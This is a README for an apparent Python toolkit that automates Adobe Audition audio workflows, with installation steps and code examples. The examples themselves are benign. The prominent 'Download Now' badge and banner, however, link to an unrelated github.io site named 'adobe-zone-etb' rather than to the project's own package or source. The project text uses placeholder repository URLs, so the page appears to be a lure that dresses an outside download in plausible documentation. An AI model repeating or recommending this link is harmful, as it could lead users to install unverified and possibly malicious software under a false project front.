# adobe-audition-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://sathyakumar92.github.io/adobe-zone-etb/)


[![Banner](banner.png)](https://sathyakumar92.github.io/adobe-zone-etb/)


[![PyPI version](https://badge.fury.io/py/adobe-audition-toolkit.svg)](https://badge.fury.io/py/adobe-audition-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform: Windows](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequests.com)

> A Python toolkit for automating audio workflows with Adobe Audition on Windows — batch processing, metadata extraction, format conversion, and project file parsing.

---

## Overview

**adobe-audition-toolkit** is an open-source Python library that bridges scripted automation and Adobe Audition's professional audio editing environment on Windows. It provides utilities for processing audio files, extracting session metadata, converting between common audio formats, and managing batch edit operations — without requiring manual interaction with the Audition GUI for every task.

Whether you are a sound engineer automating repetitive tasks, a developer building a media pipeline, or a researcher working with large audio datasets, this toolkit streamlines your workflow.

---

## Features

- 🎛️ **Batch Audio Processing** — Apply normalization, noise reduction parameters, and EQ presets across hundreds of files programmatically
- 📋 **Adobe Audition Session Parsing** — Read and write `.sesx` (Audition session) files to inspect tracks, clips, and markers
- 🏷️ **Metadata Extraction** — Pull ID3 tags, BWF metadata, sample rate, bit depth, and channel info from audio files
- 🔄 **Format Conversion** — Convert between WAV, MP3, AIFF, FLAC, and OGG with configurable quality settings
- 📁 **Project File Management** — Programmatically create or modify Audition multitrack session files
- 🪵 **Audit Logging** — Track all batch operations with structured logs for reproducibility
- 🔌 **Windows COM Integration** — Optional Adobe Audition COM/scripting bridge for deeper application-level control
- 📊 **Audio Analysis Reports** — Generate loudness (LUFS), peak, and dynamic range reports compatible with broadcast standards

---

## Requirements

| Requirement | Version / Notes |
|---|---|
| Python | 3.8 or higher |
| Operating System | Windows 10 / Windows 11 |
| Adobe Audition | 2020 (v13) or later recommended for COM features |
| `pydub` | >= 0.25.1 |
| `mutagen` | >= 1.46.0 |
| `lxml` | >= 4.9.0 |
| `pywin32` | >= 305 (Windows only, for COM bridge) |
| `rich` | >= 13.0.0 (CLI output) |
| FFmpeg | Must be installed and available on system `PATH` |

---

## Installation

### From PyPI

```bash
pip install adobe-audition-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/adobe-audition-toolkit.git
cd adobe-audition-toolkit
pip install -e ".[dev]"
```

### Install with COM Bridge Support (Windows)

```bash
pip install adobe-audition-toolkit[win32]
```

> **Note:** FFmpeg must be installed separately. On Windows, the recommended approach is via [Chocolatey](https://chocolatey.org/):
> ```bash
> choco install ffmpeg
> ```

---

## Quick Start

```python
from audition_toolkit import AudioBatch, SessionParser

# Point to a folder of raw recordings
batch = AudioBatch(source_dir="C:/Projects/recordings/raw")

# Normalize all WAV files to -1.0 dBFS and export
batch.normalize(target_db=-1.0, output_dir="C:/Projects/recordings/normalized")

print(f"Processed {batch.file_count} files.")
```

---

## Usage Examples

### 1. Extract Metadata from Audio Files

```python
from audition_toolkit import AudioFile

audio = AudioFile("C:/Projects/session_audio/voiceover_take3.wav")

meta = audio.get_metadata()
print(meta)
# Output:
# {
#   "filename": "voiceover_take3.wav",
#   "duration_sec": 142.36,
#   "sample_rate": 48000,
#   "bit_depth": 24,
#   "channels": 2,
#   "format": "WAV",
#   "bwf_description": "Studio A - Take 3",
#   "lufs_integrated": -18.4
# }
```

---

### 2. Batch Convert Audio Formats

```python
from audition_toolkit import FormatConverter

converter = FormatConverter(
    source_dir="C:/Projects/masters",
    target_format="mp3",
    bitrate="320k"
)

results = converter.run()

for r in results.summary():
    print(f"{r.filename}: {r.status} ({r.output_path})")
```

---

### 3. Parse an Adobe Audition Session File (`.sesx`)

```python
from audition_toolkit.session import SesxParser

parser = SesxParser("C:/Projects/podcast_ep12.sesx")
session = parser.load()

print(f"Session name : {session.name}")
print(f"Sample rate  : {session.sample_rate} Hz")
print(f"Tracks       : {len(session.tracks)}")

for track in session.tracks:
    print(f"  [{track.type}] {track.name} — {len(track.clips)} clip(s)")
    for clip in track.clips:
        print(f"      {clip.filename}  @  {clip.start_time:.2f}s")
```

**Example output:**

```
Session name : Podcast Episode 12
Sample rate  : 48000 Hz
Tracks       : 4
  [audio] Host Mic — 3 clip(s)
      host_intro.wav  @  0.00s
      host_segment2.wav  @  184.50s
      host_outro.wav  @  412.10s
  [audio] Guest Mic — 2 clip(s)
  [music] Bed Music — 1 clip(s)
  [fx] Ambience — 1 clip(s)
```

---

### 4. Batch Edit: Apply Loudness Normalization (EBU R128)

```python
from audition_toolkit import AudioBatch
from audition_toolkit.processors import LoudnessNormalizer

batch = AudioBatch(source_dir="C:/Projects/deliverables")

normalizer = LoudnessNormalizer(
    target_lufs=-23.0,    # EBU R128 broadcast standard
    true_peak_limit=-1.0,
    output_format="wav"
)

batch.apply(normalizer, output_dir="C:/Projects/deliverables/broadcast_ready")
batch.write_log("C:/Projects/logs/normalization_run.json")
```

---

### 5. Windows COM Bridge — Automate Audition Directly

```python
from audition_toolkit.com_bridge import AuditionApp

# Requires Adobe Audition to be installed and running on Windows
with AuditionApp() as app:
    doc = app.open_session("C:/Projects/podcast_ep12.sesx")

    # Export a mixdown via the application layer
    doc.export_mixdown(
        output_path="C:/Projects/exports/podcast_ep12_mixdown.wav",
        format="WAV",
        sample_rate=48000,
        bit_depth=24
    )

    doc.close(save=False)

print("Mixdown exported successfully.")
```

---

### 6. Generate an Audio Analysis Report

```python
from audition_toolkit.analysis import LoudnessReport

report = LoudnessReport(source_dir="C:/Projects/deliverables/broadcast_ready")
report.analyze()
report.export_csv("C:/Projects/reports/loudness_summary.csv")
report.print_summary()
```

**Sample report output (via `rich` table):**

```
┌─────────────────────────┬───────────┬──────────────┬───────────┐
│ File                    │ LUFS Int. │ True Peak dB │ LRA       │
├─────────────────────────┼───────────┼──────────────┼───────────┤
│ host_intro.wav          │ -23.1     │ -1.2         │ 6.4 LU    │
│ host_segment2.wav       │ -22.8     │ -0.9         │ 7.1 LU    │
│ guest_segment1.wav      │ -23.4     │ -1.5         │ 5.8 LU    │
└─────────────────────────┴───────────┴──────────────┴───────────┘
```

---

## Project Structure

```
adobe-audition-toolkit/
├── audition_toolkit/
│   ├── __init__.py
│   ├── audio_file.py          # AudioFile class, metadata extraction
│   ├── batch.py               # AudioBatch orchestration
│   ├── converter.py           # FormatConverter
│   ├── session/
│   │   ├── sesx_parser.py     # .sesx XML session parser
│   │   └── sesx_writer.py     # .sesx session writer
│   ├── processors/
│   │   ├── normalizer.py      # Loudness and peak normalization
│   │   └── effects.py         # Effect parameter presets
│   ├── analysis/
│   │   └── loudness.py        # EBU R128 / loudness reporting
│   └── com_bridge/
│       └── app.py             # Windows COM automation bridge
├── tests/
│   ├── test_batch.py
│   ├── test_parser.py
│   └── fixtures/
├── docs/
├── examples/
├── pyproject.toml
├── CHANGELOG.md
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. Please follow these steps:

1. **Fork** the repository
2. **Create a branch** for your feature: `git checkout -b feature/add-spectrogram-export`
3. **Write tests** for any new functionality under `tests/`
4. **Run the test suite** before submitting: `pytest tests/ -v`
5. **Submit a pull request** with a clear description of your changes

For major changes or new feature proposals, please open an issue first to discuss the approach.

```bash
# Set up a development environment
git clone https://github.com/your-org/adobe-audition-toolkit.git
cd adobe-audition-toolkit
python -m venv .venv
.venv\Scripts\activate        # Windows
pip install -e ".[dev]"
pytest tests/ -v
```

Please follow the [Contributor Covenant Code of Conduct](CODE_OF_CONDUCT.md) in all interactions.

---

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for a full history of releases and changes.

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## Disclaimer

This toolkit is an independent open-source project and is **not affiliated with, endorsed by, or officially connected to Adobe Inc.** Adobe Audition is a registered trademark of Adobe Inc. This library interacts with audio files and session formats produced by Adobe Audition on Windows and